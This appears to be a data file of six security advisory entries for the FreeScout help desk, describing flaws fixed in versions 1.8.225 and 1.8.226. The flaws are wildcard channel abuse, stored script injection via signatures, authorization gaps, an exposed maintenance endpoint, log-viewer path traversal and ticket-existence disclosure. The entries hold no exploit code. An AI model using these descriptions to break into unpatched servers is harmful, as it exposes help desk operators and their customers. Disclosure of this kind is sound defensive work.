items.title: FreeScout is a self-hosted help desk and shared mailbox application.
items.description: FreeScout is a self-hosted help desk and shared mailbox application. Prior to version 1.8.226, the  polycast/receive  endpoint fails to escape SQL LIKE wildcards in supplied channel names, while channel authorization applies only to names with specific prefixes. An unauthenticated attacker with a guest session and valid CSRF token can submit a wildcard channel name to retrieve matching notification events intended for other users. Notification payload generation lacks a corresponding access check, exposing conversation message content, identifiers, URLs, and notification HTML across users and mailboxes. This issue is fixed in version 1.8.226.

items.title: FreeScout is a self-hosted help desk and shared mailbox.
items.description: FreeScout is a self-hosted help desk and shared mailbox. Prior to 1.8.225, a user who can edit a mailbox signature can combine a scriptable file uploaded through /uploads/upload with nested tag fragments that bypass Helper::stripDangerousTags(). The resulting external script is served from the same origin, so the script-src 'self' policy permits it when another user opens the affected mailbox reply editor or new-ticket page. The script executes with the victim's FreeScout privileges and can read visible data and perform same-origin actions. This issue is fixed in version 1.8.225.

items.title: FreeScout is a self-hosted help desk and shared mailbox.
items.description: FreeScout is a self-hosted help desk and shared mailbox. Prior to 1.8.226, RealtimeConvNewThread checks only general mailbox access and does not apply the conversation-level restriction for users configured to see only assigned conversations. A restricted authenticated user can subscribe to predictable conv.<conversation_id> Polycast channels for other conversations in the same mailbox. New event payloads can expose complete replies, internal notes, recipient addresses, conversation state, assignee data, attachment names, and attachment URLs containing valid download tokens. This issue is fixed in version 1.8.226.

items.title: FreeScout is a self-hosted help desk and shared mailbox.
items.description: FreeScout is a self-hosted help desk and shared mailbox. Prior to 1.8.225, the administrative tools.php maintenance endpoint is reachable without an appropriate authentication or access-control boundary. Response differences for attacker-controlled path values disclose whether arbitrary directories and files exist on the server. The same endpoint validates application-key and database-password candidates without rate limiting, per-session throttling, or a CAPTCHA, allowing unrestricted guessing attempts against application secrets. This issue is fixed in version 1.8.225.

items.title: FreeScout is a self-hosted help desk and shared mailbox.
items.description: FreeScout is a self-hosted help desk and shared mailbox. Prior to 1.8.225, the administrator-only App Logs viewer accepts Laravel-encrypted folder and file parameters whose constructed path is checked only as a raw string. An administrator who also knows the APP_KEY can supply traversal segments that the filesystem normalizes outside storage/logs. The /app-logs/app route can then read local files accessible to the PHP worker, including environment files, source files, credentials, tokens, and operating-system files. This issue is fixed in version 1.8.225.

items.title: FreeScout is a self-hosted help desk and shared mailbox.
items.description: FreeScout is a self-hosted help desk and shared mailbox. Prior to 1.8.226, the search-by-number shortcut in ConversationsController::search() resolves a user-controlled ticket number without applying the mailbox filter or view policy used by the normal search path. An authenticated non-admin agent who is a member of at least one mailbox can request /search with a hash-prefixed ticket number and use the 302 Location header to confirm that a conversation exists in a different mailbox the agent cannot access and learn its internal conversation and folder identifiers. The destination conversation remains protected, so this issue does not disclose message content, attachments, or customer data. This issue is fixed in version 1.8.226.
